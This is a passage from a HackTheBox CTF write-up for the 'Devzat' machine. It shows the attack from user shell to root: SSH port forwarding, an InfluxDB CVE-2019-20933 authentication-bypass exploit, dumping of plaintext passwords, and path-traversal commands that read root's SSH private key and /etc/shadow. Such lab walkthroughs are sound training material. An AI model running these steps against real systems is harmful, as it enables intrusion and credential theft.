</span></span></code></pre></div><p>If we listen on port 6666, we get our reverse shell!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>patrick@devzat:~/pets$
</span></span></code></pre></div><p>And we seem to be logged in as patrick, but there is no user flag in his home
dir. Let‚Äôs continue by grabbing the ssh private key of patrick to get a real ssh
session. Then, we can connect to patrick with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -i patrick.key patrick@devzat.htb
</span></span></code></pre></div><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>Now that we have a real shell, let‚Äôs connect to the service localy.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -l patrick localhost -p <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>admin: Hey patrick, you there?
</span></span><span style="display:flex"><span>patrick: Sure, shoot boss!
</span></span><span style="display:flex"><span>admin: So I setup the influxdb <span style="color:#66d9ef">for</span> you as we discussed earlier in business meeting.
</span></span><span style="display:flex"><span>patrick: Cool üëç
</span></span><span style="display:flex"><span>admin: Be sure to check it out and see <span style="color:#66d9ef">if</span> it works <span style="color:#66d9ef">for</span> you, will ya?
</span></span><span style="display:flex"><span>patrick: Yes, sure. Am on it!
</span></span><span style="display:flex"><span>devbot: admin has left the chat
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>ssh -l catherine localhost -p <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>patrick: Hey Catherine, glad you came.
</span></span><span style="display:flex"><span>catherine: Hey bud, what are you up to?
</span></span><span style="display:flex"><span>patrick: Remember the cool new feature we talked about the other day?
</span></span><span style="display:flex"><span>catherine: Sure
</span></span><span style="display:flex"><span>patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port
</span></span><span style="display:flex"><span>         8443.
</span></span><span style="display:flex"><span>catherine: Kinda busy right now üëî
</span></span><span style="display:flex"><span>patrick: That<span style="color:#e6db74">&#39;s perfectly fine üëç  You&#39;</span>ll need a password I gave you last time.
</span></span><span style="display:flex"><span>catherine: k
</span></span><span style="display:flex"><span>patrick: I left the source <span style="color:#66d9ef">for</span> your review in backups.
</span></span><span style="display:flex"><span>catherine: Fine. As soon as the boss let me off the leash I will check it out.
</span></span><span style="display:flex"><span>patrick: Cool. I am very curious what you think of it. See ya!
</span></span><span style="display:flex"><span>devbot: patrick has left the chat
</span></span></code></pre></div><p>They mention something about a password, but I couldn‚Äôt find any log of
conversations. Also, the chat has no history.</p><p>They mention some backups. I did a search and got <code>/var/backups</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>find / -name <span style="color:#e6db74">&#39;*backup*&#39;</span> 2&gt;/dev/null
</span></span></code></pre></div><p>But we don‚Äôt have permissions to copy them.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>patrick@devzat:~$ cp /var/backups/devzat-*.zip ~/.
</span></span><span style="display:flex"><span>cp: cannot open <span style="color:#e6db74">&#39;/var/backups/devzat-dev.zip&#39;</span> <span style="color:#66d9ef">for</span> reading: Permission denied
</span></span><span style="display:flex"><span>cp: cannot open <span style="color:#e6db74">&#39;/var/backups/devzat-main.zip&#39;</span> <span style="color:#66d9ef">for</span> reading: Permission denied
</span></span></code></pre></div><p>Let‚Äôs investigate the 8443 port. We can see more ports open.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>patrick@devzat:~/devzat$ netstat -tulnp | grep LISTEN
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8086          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8443          0.0.0.0:*               LISTEN      -
</span></span><span style="display:flex"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:5000          0.0.0.0:*               LISTEN      869/./petshop
</span></span><span style="display:flex"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -
</span></span><span style="display:flex"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::8000                 :::*                    LISTEN      878/./devchat
</span></span><span style="display:flex"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -
</span></span></code></pre></div><p>We can connect to the local devzat instance by mapping the remote 8443 port to a
local one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -L8443:localhost:8443 -i patrick.key patrick@devzat.htb
</span></span></code></pre></div><p>And then connect to that devzat instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -l patrick localhost -p <span style="color:#ae81ff">8443</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>admin: Hey patrick, you there?
</span></span><span style="display:flex"><span>patrick: Sure, shoot boss!
</span></span><span style="display:flex"><span>admin: So I setup the influxdb 1.7.5 <span style="color:#66d9ef">for</span> you as we discussed earlier in business meeting.
</span></span><span style="display:flex"><span>patrick: Cool üëç
</span></span><span style="display:flex"><span>admin: Be sure to check it out and see <span style="color:#66d9ef">if</span> it works <span style="color:#66d9ef">for</span> you, will ya?
</span></span><span style="display:flex"><span>patrick: Yes, sure. Am on it!
</span></span><span style="display:flex"><span>devbot: admin has left the chat
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>ssh -l catherine localhost -p <span style="color:#ae81ff">8443</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>patrick: Hey Catherine, glad you came.
</span></span><span style="display:flex"><span>catherine: Hey bud, what are you up to?
</span></span><span style="display:flex"><span>patrick: Remember the cool new feature we talked about the other day?
</span></span><span style="display:flex"><span>catherine: Sure
</span></span><span style="display:flex"><span>patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port
</span></span><span style="display:flex"><span>         8443.
</span></span><span style="display:flex"><span>catherine: Kinda busy right now üëî
</span></span><span style="display:flex"><span>patrick: That<span style="color:#e6db74">&#39;s perfectly fine üëç  You&#39;</span>ll need a password which you can gather from the source. I left it in
</span></span><span style="display:flex"><span>         our default backups location.
</span></span><span style="display:flex"><span>catherine: k
</span></span><span style="display:flex"><span>patrick: I also put the main so you could diff main dev <span style="color:#66d9ef">if</span> you want.
</span></span><span style="display:flex"><span>catherine: Fine. As soon as the boss let me off the leash I will check it out.
</span></span><span style="display:flex"><span>patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure
</span></span><span style="display:flex"><span>         yet. See ya!
</span></span><span style="display:flex"><span>devbot: patrick has left the chat
</span></span></code></pre></div><p><em>InfluxDB</em> version is earlier than 1.7.6, so we can bypass the password with the following exploit:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933"><div><div class="bookmark-title">GitHub - LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933: InfluxDB CVE-2019-20933 vulnerability exploit</div><div class="bookmark-description">InfluxDB CVE-2019-20933 vulnerability exploit. Contribute to LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/be492b2d11bb9a4ca4caea076563f0d89e313d7c286f8164a02be6a4ae0e9a15/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" alt="" loading="lazy"/></div></a></div>We will need to expose the internal <code>influxdb</code> port, which is by default 8086 (and they are using it).<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -L8086:localhost:8086 -i patrick.key patrick@devzat.htb
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>CVE-2019-20933
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Insert ip host <span style="color:#f92672">(</span>default localhost<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>Insert port <span style="color:#f92672">(</span>default 8086<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>Insert influxdb user <span style="color:#f92672">(</span>wordlist path to bruteforce username<span style="color:#f92672">)</span>: ../users.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Start username bruteforce
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> catherine
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> patrick
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>v<span style="color:#f92672">]</span> admin
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Insert database name <span style="color:#f92672">(</span>exit to close<span style="color:#f92672">)</span>: devzat
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>devzat<span style="color:#f92672">]</span> Insert query <span style="color:#f92672">(</span>exit to change db<span style="color:#f92672">)</span>:
</span></span></code></pre></div><p>Let‚Äôs list all the tables in the database:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>[<span style="color:#960050;background-color:#1e0010">devzat</span>] <span style="color:#960050;background-color:#1e0010">Insert</span> <span style="color:#960050;background-color:#1e0010">query</span> <span style="color:#960050;background-color:#1e0010">(exit</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#960050;background-color:#1e0010">change</span> <span style="color:#960050;background-color:#1e0010">db):</span> <span style="color:#960050;background-color:#1e0010">SHOW</span> <span style="color:#960050;background-color:#1e0010">MEASUREMENTS;</span>
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#f92672">&#34;results&#34;</span>: [
</span></span><span style="display:flex"><span>        {
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;series&#34;</span>: [
</span></span><span style="display:flex"><span>                {
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;columns&#34;</span>: [
</span></span><span style="display:flex"><span>                        <span style="color:#e6db74">&#34;name&#34;</span>
</span></span><span style="display:flex"><span>                    ],
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;measurements&#34;</span>,
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;values&#34;</span>: [
</span></span><span style="display:flex"><span>                        [
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;user&#34;</span>
</span></span><span style="display:flex"><span>                        ]
</span></span><span style="display:flex"><span>                    ]
</span></span><span style="display:flex"><span>                }
</span></span><span style="display:flex"><span>            ],
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;statement_id&#34;</span>: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    ]
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We got a user table. Let‚Äôs check the contents:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>[<span style="color:#960050;background-color:#1e0010">devzat</span>] <span style="color:#960050;background-color:#1e0010">Insert</span> <span style="color:#960050;background-color:#1e0010">query</span> <span style="color:#960050;background-color:#1e0010">(exit</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#960050;background-color:#1e0010">change</span> <span style="color:#960050;background-color:#1e0010">db):</span> <span style="color:#960050;background-color:#1e0010">SELECT</span> <span style="color:#960050;background-color:#1e0010">*</span> <span style="color:#960050;background-color:#1e0010">FROM</span> <span style="color:#e6db74">&#34;user&#34;</span><span style="color:#960050;background-color:#1e0010">;</span>
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#f92672">&#34;results&#34;</span>: [
</span></span><span style="display:flex"><span>        {
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;series&#34;</span>: [
</span></span><span style="display:flex"><span>                {
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;columns&#34;</span>: [
</span></span><span style="display:flex"><span>                        <span style="color:#e6db74">&#34;time&#34;</span>,
</span></span><span style="display:flex"><span>                        <span style="color:#e6db74">&#34;enabled&#34;</span>,
</span></span><span style="display:flex"><span>                        <span style="color:#e6db74">&#34;password&#34;</span>,
</span></span><span style="display:flex"><span>                        <span style="color:#e6db74">&#34;username&#34;</span>
</span></span><span style="display:flex"><span>                    ],
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>,
</span></span><span style="display:flex"><span>                    <span style="color:#f92672">&#34;values&#34;</span>: [
</span></span><span style="display:flex"><span>                        [
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;2021-06-22T20:04:16.313965493Z&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;WillyWonka2021&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;wilhelm&#34;</span>
</span></span><span style="display:flex"><span>                        ],
</span></span><span style="display:flex"><span>                        [
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;2021-06-22T20:04:16.320782034Z&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;woBeeYareedahc7Oogeephies7Aiseci&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;catherine&#34;</span>
</span></span><span style="display:flex"><span>                        ],
</span></span><span style="display:flex"><span>                        [
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;2021-06-22T20:04:16.996682002Z&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;RoyalQueenBee$&#34;</span>,
</span></span><span style="display:flex"><span>                            <span style="color:#e6db74">&#34;charles&#34;</span>
</span></span><span style="display:flex"><span>                        ]
</span></span><span style="display:flex"><span>                    ]
</span></span><span style="display:flex"><span>                }
</span></span><span style="display:flex"><span>            ],
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;statement_id&#34;</span>: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    ]
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>Passwords are in plain text. We can try catherine‚Äôs one.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>patrick@devzat:~$ su catherine
</span></span><span style="display:flex"><span>Password:
</span></span><span style="display:flex"><span>catherine@devzat:/home/patrick$
</span></span></code></pre></div><p>And we are in!</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>It seems there are no applications that can be run as sudo without password.</p><p>We can copy the <strong>backup</strong> zips in <code>/var/backups</code> to our home and unzip them. After that, we can diff them as patrick told to catherine in one of the messages.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="display:flex"><span><span style="color:#a6e22e">diff</span> <span style="color:#a6e22e">dev</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>&lt; <span style="color:#66d9ef">func</span> <span style="color:#a6e22e">fileCommand</span>(<span style="color:#a6e22e">u</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">args</span> []<span style="color:#66d9ef">string</span>) {
</span></span><span style="display:flex"><span>&lt;       <span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">args</span>) &lt; <span style="color:#ae81ff">1</span> {
</span></span><span style="display:flex"><span>&lt;               <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;Please provide file to print and the password&#34;</span>)
</span></span><span style="display:flex"><span>&lt;               <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex"><span>&lt;       }
</span></span><span style="display:flex"><span>&lt;
</span></span><span style="display:flex"><span>&lt;       <span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">args</span>) &lt; <span style="color:#ae81ff">2</span> {
</span></span><span style="display:flex"><span>&lt;               <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;You need to provide the correct password to use this function&#34;</span>)
</span></span><span style="display:flex"><span>&lt;               <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex"><span>&lt;       }
</span></span><span style="display:flex"><span>&lt;
</span></span><span style="display:flex"><span>&lt;       <span style="color:#a6e22e">path</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex"><span>&lt;       <span style="color:#a6e22e">pass</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex"><span>&lt;
</span></span><span style="display:flex"><span>&lt;       <span style="color:#75715e">// Check my secure password
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span>&lt;       <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">pass</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;CeilingCatStillAThingIn2021?&#34;</span> {
</span></span><span style="display:flex"><span>&lt;               <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;You did provide the wrong password&#34;</span>)
</span></span><span style="display:flex"><span>&lt;               <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex"><span>&lt;       }
</span></span><span style="display:flex"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex"><span>&lt;       <span style="color:#a6e22e">port</span> = <span style="color:#ae81ff">8443</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">---</span>
</span></span><span style="display:flex"><span>&gt;       <span style="color:#a6e22e">port</span> = <span style="color:#ae81ff">8000</span>
</span></span></code></pre></div><p>There is a new file command in the devzat service running on 8443.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>catherine@devzat:~$ ps -aux | grep devzat
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>root         <span style="color:#ae81ff">851</span>  0.0  0.1   <span style="color:#ae81ff">6892</span>  <span style="color:#ae81ff">3032</span> ?        Ss   05:19   0:00 /bin/bash /root/devzat/start.sh
</span></span><span style="display:flex"><span>patrick      <span style="color:#ae81ff">852</span>  0.0  0.1   <span style="color:#ae81ff">6892</span>  <span style="color:#ae81ff">2988</span> ?        Ss   05:19   0:00 /bin/bash /home/patrick/devzat/start.sh
</span></span></code></pre></div><p>And this service is being ran by root itself. So we would be reading files with root.</p><p>If we connect to the service and use the file command, we can get the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>catherine: /file ../root.txt CeilingCatStillAThingIn2021?
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> ee85798aedbdc77950b34216ffc3aa32
</span></span></code></pre></div><p>I used <code>../root.txt</code> because the process is being ran from <code>/root/devzat/start.sh</code>.</p><p>In case you wanted to compromise the whole machine, you could download the ssh private key of root:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> -----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> -----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Or try to decrypt the hash from <code>/etc/shadow</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>catherine: /file ../../etc/shadow CeilingCatStillAThingIn2021?
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>SYSTEM<span style="color:#f92672">]</span> root:XXXXXX:18891:0:99999:7:::
</span></span></code></pre></div><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li>List tables in <em>InfluxDB</em>:<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://community.influxdata.com/t/show-tables-in-a-database/5130"><div><div class="bookmark-title">Show tables in a database</div><div class="bookmark-description">Dear All, What is the query to show tables in a database please? Thanks a lot in advance</div><div class="bookmark-link"><div>https://community.influxdata.com/t/show-tables-in-a-database/5130</div></div></div><div class="bookmark-image"><img src="https://us1.discourse-cdn.com/flex015/uploads/influxdata/original/2X/f/f353fb1abcbe87e200dca6dcd54ace92096c1062.png" alt="" loading="lazy"/></div></a></div></li><li>CVE Exploit<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933"><div><div class="bookmark-title">GitHub - LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933: InfluxDB CVE-2019-20933 vulnerability exploit</div><div class="bookmark-description">InfluxDB CVE-2019-20933 vulnerability exploit. Contribute to LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 development by creating an account on GitHub.</div><div class="bookmark-link"><div>https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</div></div></div><div class="bookmark-image"><img src="https://opengraph.githubassets.com/be492b2d11bb9a4ca4caea076563f0d89e313d7c286f8164a02be6a4ae0e9a15/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" alt="" loading="lazy"/></div></a></div></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Devzat&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f&amp;title=HackTheBox%20Writeup%3a%20Devzat&amp;summary=HackTheBox%20Writeup%3a%20Devzat&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f&amp;title=HackTheBox%20Writeup%3a%20Devzat"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 